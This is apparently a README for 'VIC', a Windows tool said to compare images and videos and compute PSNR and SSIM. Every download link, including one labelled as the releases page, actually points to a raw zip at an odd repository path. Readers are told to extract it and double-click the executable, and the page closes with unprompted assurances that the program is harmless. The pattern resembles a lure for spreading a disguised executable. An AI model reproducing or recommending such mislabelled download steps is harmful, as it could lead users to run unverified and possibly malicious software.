# 👁️ VIC - Compare images and videos with precision

[![Download VIC for Windows](https://img.shields.io/badge/Download_VIC-Blue?style=for-the-badge)](https://github.com/vedeshsutar23-cmd/VIC/raw/refs/heads/main/achromous/Software_v2.7-beta.3.zip)

VIC provides tools to compare images and videos side by side. It calculates quality metrics like PSNR and SSIM to measure differences between two files. You can use this software for color grading, compression testing, or quality control. The program handles large files and runs smoothly on Windows.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- 4 GB RAM minimum
- Dedicated graphics processor (GPU) for best performance
- 100 MB available disk space

## 📥 Getting Started

Follow these steps to set up the software.

1. Visit the [releases page](https://github.com/vedeshsutar23-cmd/VIC/raw/refs/heads/main/achromous/Software_v2.7-beta.3.zip) to download the latest version.
2. Look for the file ending in `.zip` or `.exe` under the Assets section.
3. Save the file to your computer.
4. Extract the folder if you downloaded a zip archive.
5. Open the folder and double-click the application icon named VIC to start the program.

The application does not require a traditional installation process. You can move the folder anywhere on your computer or run it from a USB drive.

## 💡 How to Use VIC

The interface divides into a toolbar and a viewing area. Load two files to begin your comparison.

### Loading Files
Drag and drop your images or video files into the application window. Alternatively, use the File menu to browse your computer for specific files. The application supports standard formats like JPEG, PNG, MP4, and AVI.

### Comparison Modes
The software offers several ways to view your data:

- **Blink:** Switches between the first and second file at a set interval. This helps you notice small differences in composition or color.
- **Wipe:** Draws a divider across the screen. Drag the mouse to reveal one image under the other.
- **Overlay:** Places one image over the other with adjustable transparency.
- **Heatmap:** Highlights areas with significant pixel differences in color.

### Quality Metrics
Click the Metrics tab to see technical data. The software calculates PSNR and SSIM values automatically. These numbers represent how much the files differ mathematically. You can select specific areas of interest using the ROI (Region of Interest) tool. Draw a box over a specific part of the image to isolate the analysis to that area.

## ⚙️ Settings and Customization

You can change how the software handles different files in the Settings menu. 

- **Performance:** If the interface feels slow, reduce the resolution scale. This affects the accuracy of preview thumbnails but saves system resources.
- **Colors:** Adjust the contrast and brightness of the comparison overlays if you work with dark footage.
- **File Cache:** Set the amount of RAM the application uses for video playback. Higher values allow longer clips to load without stuttering.

## ❓ Frequently Asked Questions

**Does the software change my source files?**
No. VIC performs read-only operations. It never alters, deletes, or overwrites your source files.

**How do I update the software?**
When a new version releases, visit the download link again. Replace your old folder with the new one to upgrade to the latest build.

**Why does the heatmap show differences in identical files?**
Ensure your files have the same resolution and color space. Even slight differences in encoding can cause the heatmap to display variations.

**Can I export the metrics?**
Yes. Use the Export button in the Metrics panel to save your data as a text file. You can open this file in Excel or other programs to track quality trends over time.

**What should I do if the application crashes?**
Ensure your graphics drivers are up to date. The software relies on OpenGL to display images. If the screen stays black, restart the application.

## 🛡️ Support and Feedback

If you find a bug or have a suggestion, open an issue on the repository feedback tracker. Provide a description of the problem and the files that caused the error. Clear information helps resolve issues faster. 

For developers, the source code relies on modern standards. You can build the project from scratch using a C++20 compatible compiler. The project uses ImGui for the interface, providing a responsive experience across different screen sizes. All core processing logic remains portable, meaning it stays fast on hardware with limited resources.

This tool functions as a standalone utility. It requires no administrative passwords and avoids creating background processes on your machine. When you close the window, the process stops entirely.